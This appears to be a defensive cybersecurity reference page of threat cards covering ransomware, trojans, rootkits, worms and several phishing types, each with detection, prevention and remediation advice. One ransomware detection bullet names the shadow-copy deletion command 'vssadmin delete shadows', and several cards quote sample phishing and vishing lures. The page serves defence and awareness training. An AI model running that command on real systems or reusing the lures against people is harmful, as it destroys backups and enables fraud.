MALWARERansomwareCRITICAL+
Encrypts victim's files and demands cryptocurrency ransom for decryption key. Modern double-extortion variants steal data BEFORE encrypting — threatening to publish it if ransom unpaid.
📌 WannaCry 2017 — used EternalBlue SMB exploit to self-spread across networks. 200,000 systems in 150 countries. UK NHS hospitals forced to cancel appointments. $4B in damages.
🔍 Detect
  • Mass file renaming / extension changes
  • vssadmin delete shadows command (EDR)
  • Spike in disk write activity
🛡️ Prevent
  • Offline immutable backups (3-2-1 rule)
  • Patch management — disable SMBv1
  • EDR with behavioural detection
🔧 Remediate
  • Isolate all infected systems immediately
  • DO NOT pay ransom
  • Restore from clean pre-infection backups
MALWARETrojan HorseHIGH+
Disguises itself as legitimate software but contains hidden malicious code. Unlike worms, Trojans don't self-replicate — they rely on users running them willingly.
📌 "Free VPN" app downloaded from shady site installs an AsyncRAT Remote Access Trojan in background. Attacker has full control of the machine silently.
🔍 Detect
  • Unexpected outbound connections to unknown IPs
  • New startup entries or scheduled tasks
  • EDR behavioural detection alerts
🛡️ Prevent
  • Only install from official sources
  • Application allowlisting
  • Endpoint AV with real-time protection
🔧 Remediate
  • Quarantine infected machine
  • Remove all persistence mechanisms
  • Reset all credentials used on machine
MALWARERootkitCRITICAL+
Hides itself deep within the OS (often at kernel level) making it invisible to standard AV tools. Once a rootkit is installed, the system itself cannot be trusted.
📌 Sony BMG 2005 — secretly installed a rootkit on millions of PCs via music CDs. Made systems vulnerable to other malware while hiding Sony's DRM software.
🔍 Detect
  • Rootkit-specific scanners (GMER)
  • Process list discrepancies
  • File integrity monitoring (Tripwire)
🛡️ Prevent
  • Enable Secure Boot / UEFI
  • Keep OS and firmware updated
  • EDR with deep process monitoring
🔧 Remediate
  • Complete OS reinstall recommended
  • Restore from known-good image
  • Never trust the infected system
MALWAREWormCRITICAL+
Self-replicating malware that spreads automatically across networks without any user interaction — exploiting vulnerabilities or open shares.
📌 WannaCry used EternalBlue (NSA exploit) on SMBv1. One infected machine spreads to every other vulnerable machine on the same network. Zero clicks required from anyone.
🔍 Detect
  • Spike in internal network scanning
  • Multiple machines infected rapidly
  • IDS alerting on EternalBlue / SMB scanning
🛡️ Prevent
  • Patch management — especially critical CVEs
  • Disable SMBv1 and unused protocols
  • Network segmentation
🔧 Remediate
  • Isolate infected network segment
  • Patch ALL systems before reconnecting
  • Identify patient zero and entry vector
PHISHINGGeneric PhishingHIGH+
Mass emails impersonating trusted entities to trick users into revealing credentials or clicking malicious links. Low effort, high volume, relies on scale.
📌 "Your Microsoft 365 account is suspended. Click here to verify." → Fake Microsoft login page → credentials stolen. Sent to 100,000 addresses — even 0.1% success = 100 compromised accounts.
🔍 Detect
  • SPF/DKIM/DMARC failures in email gateway
  • Multiple users reporting same email
  • Proxy: clicks to known malicious URLs
🛡️ Prevent
  • Deploy DMARC, SPF, DKIM
  • Email security gateway (Proofpoint)
  • Phishing awareness training
🔧 Remediate
  • Pull email from all mailboxes via admin
  • Reset credentials for users who clicked
  • Block sender domain in email gateway
PHISHINGSpear PhishingCRITICAL+
Highly targeted phishing using OSINT about the victim to craft a personalized, convincing email. Much harder to detect than generic phishing.
📌 "Hi Sarah, as discussed in Tuesday's budget meeting with the CFO, please review the updated Q4 report attached." — Attacker knew about the meeting from LinkedIn. Attachment = malware.
🔍 Detect
  • Email sandbox detonation of attachments
  • Users report "suspicious but realistic" emails
  • Unusual login/activity post-email-open
🛡️ Prevent
  • Minimize OSINT exposure on LinkedIn
  • External email banners on all inbound email
  • Verify unusual requests via phone
🔧 Remediate
  • Isolate targeted user's machine if attachment opened
  • Investigate attacker's infrastructure
PHISHINGWhaling / CEO Fraud / BECCRITICAL+
Targets C-suite executives or spoofs them to authorize large wire transfers. Business Email Compromise (BEC) needs zero malware — just a convincing email.
📌 Ubiquiti Networks 2015 — CFO received fake email from "CEO" requesting urgent $46.7M wire transfer for acquisition. Money transferred. Company lost $46.7M.
🔍 Detect
  • Emails impersonating exec names from external domains
  • DMARC failure on emails claiming your domain
  • Finance team reports urgent unusual wire requests
🛡️ Prevent
  • Dual approval for all wire transfers
  • Verify all requests via phone call
  • Strict DMARC policy on your domain
🔧 Remediate
  • Contact bank immediately to recall wire
  • Report to FBI IC3 and law enforcement
PHISHINGVishing & SmishingHIGH+
Vishing: Voice/phone phishing — attacker impersonates IT, bank, or government. AI voice cloning makes this increasingly convincing. Smishing: SMS phishing — fake delivery/bank messages with malicious links.
📌 "Hi, this is Mike from IT. We've detected malware on your computer — I need your VPN password to fix it remotely." There is no Mike. There is no malware. Yet.
🔍 Detect
  • Unusual logins following reported calls
  • Help desk logs of callers requesting access
  • MDM alerts for SMS link clicks
🛡️ Prevent
  • IT policy: never ask for passwords by phone
  • Caller identity verification procedures
  • Train staff to hang up and call back officially
🔧 Remediate
  • Reset any credentials shared during call
  • Brief all staff on the active campaign
